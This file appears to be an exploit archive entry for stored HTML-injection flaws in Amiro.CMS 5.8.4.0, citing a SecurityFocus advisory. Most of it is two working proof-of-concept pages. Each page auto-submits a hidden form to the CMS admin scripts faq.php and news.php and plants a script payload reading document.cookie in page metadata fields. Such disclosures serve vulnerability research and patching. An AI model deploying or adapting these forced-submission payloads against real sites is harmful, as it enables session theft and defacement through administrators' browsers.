@@ -1,0 +1,116 @@
+source: http://www.securityfocus.com/bid/42908/info
+
+Amiro.CMS is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Amiro.CMS 5.8.4.0 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/_admin/faq.php" method="post" name="main" >
+
+<input type="hidden" name="id" value="3" />
+<input type="hidden" name="action" value="apply" />
+<input type="hidden" name="action_original" value="apply" />
+<input type="hidden" name="_form_data" value="1" />
+<input type="hidden" name="email" value="" />
+<input type="hidden" name="cols" value="" />
+<input type="hidden" name="datefrom" value="31.12.1979" />
+<input type="hidden" name="enc_datefrom" value="31.12.1979" />
+<input type="hidden" name="dateto" value="31.12.2034" />
+<input type="hidden" name="enc_dateto" value="31.12.2034" />
+<input type="hidden" name="sort" value="answered" />
+<input type="hidden" name="enc_sort" value="answered" />
+<input type="hidden" name="sdim" value="asc" />
+<input type="hidden" name="enc_sdim" value="asc" />
+<input type="hidden" name="offset" value="0" />
+<input type="hidden" name="enc_offset" value="0" />
+<input type="hidden" name="limit" value="10" />
+<input type="hidden" name="enc_limit" value="10" />
+<input type="hidden" name="_grp_ids" value="" />
+<input type="hidden" name="enc__grp_ids" value="" />
+<input type="hidden" name="flt_subject_id" value="0" />
+<input type="hidden" name="enc_flt_subject_id" value="0" />
+<input type="hidden" name="flt_question" value="" />
+<input type="hidden" name="enc_flt_question" value="" />
+<input type="hidden" name="flt_urgent" value="0" />
+<input type="hidden" name="enc_flt_urgent" value="0" />
+<input type="hidden" name="public" value="checked" />
+<input type="hidden" name="publish" value="" />
+<input type="hidden" name="public" value="1" />
+<input type="hidden" name="date" value="11.08.2009" />
+<input type="hidden" name="cat_id" value="8" />
+<input type="hidden" name="catname" value="" />
+<input type="hidden" name="author" value="author name" />
+<input type="hidden" name="email" value="" />
+<input type="hidden" name="send" value="1" />
+<input type="hidden" name="sublink" value="faq-page-link" />
+<input type="hidden" name="original_sublink" value="faq-page-link" />
+<input type="hidden" name="html_title" value="html title" />
+<input type="hidden" name="original_html_title" value="html title" />
+<input type="hidden" name="html_keywords" value="key1" />
+<input type="hidden" name="original_html_keywords" value="key1" />
+<input type="hidden" name="is_keywords_manual" value="0" />
+<input type="hidden" name="html_description" value='descr"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="original_html_description" value="descr" />
+<input type="hidden" name="answer" value="answer text" />
+<input type="hidden" name="question" value="question text" />
+<input type="hidden" name="apply" value="OK" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+<form action="http://www.example.com/_admin/news.php" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="id" value="31" />
+<input type="hidden" name="action" value="apply" />
+<input type="hidden" name="action_original" value="apply" />
+<input type="hidden" name="_form_data" value="1" />
+<input type="hidden" name="datefrom" value="31.12.1979" />
+<input type="hidden" name="enc_datefrom" value="31.12.1979" />
+<input type="hidden" name="dateto" value="31.12.2034" />
+<input type="hidden" name="enc_dateto" value="31.12.2034" />
+<input type="hidden" name="sort" value="id" />
+<input type="hidden" name="enc_sort" value="id" />
+<input type="hidden" name="sdim" value="desc" />
+<input type="hidden" name="enc_sdim" value="desc" />
+<input type="hidden" name="offset" value="0" />
+<input type="hidden" name="enc_offset" value="0" />
+<input type="hidden" name="limit" value="10" />
+<input type="hidden" name="enc_limit" value="10" />
+<input type="hidden" name="_grp_ids" value="" />
+<input type="hidden" name="enc__grp_ids" value="" />
+<input type="hidden" name="flt_archive" value="0" />
+<input type="hidden" name="enc_flt_archive" value="0" />
+<input type="hidden" name="flt_header" value="" />
+<input type="hidden" name="enc_flt_header" value="" />
+<input type="hidden" name="flt_urgent" value="0" />
+<input type="hidden" name="enc_flt_urgent" value="0" />
+<input type="hidden" name="publish" value="" />
+<input type="hidden" name="arch" value="" />
+<input type="hidden" name="ltime" value="1281787153" />
+<input type="hidden" name="public" value="1" />
+<input type="hidden" name="date" value="28.08.2009" />
+<input type="hidden" name="time" value="13:40:07" />
+<input type="hidden" name="header" value="header" />
+<input type="hidden" name="srv_tags" value="tags" />
+<input type="hidden" name="sublink" value="newslink" />
+<input type="hidden" name="original_sublink" value="newslink" />
+<input type="hidden" name="html_title" value="title" />
+<input type="hidden" name="original_html_title" value="title" />
+<input type="hidden" name="html_keywords" value='keys"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="original_html_keywords" value="keys" />
+<input type="hidden" name="is_keywords_manual" value="0" />
+<input type="hidden" name="html_description" value="descr" />
+<input type="hidden" name="original_html_description" value="descr" />
+<input type="hidden" name="body" value="" />
+<input type="hidden" name="announce" value="announce" />
+<input type="hidden" name="apply" value="OK" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
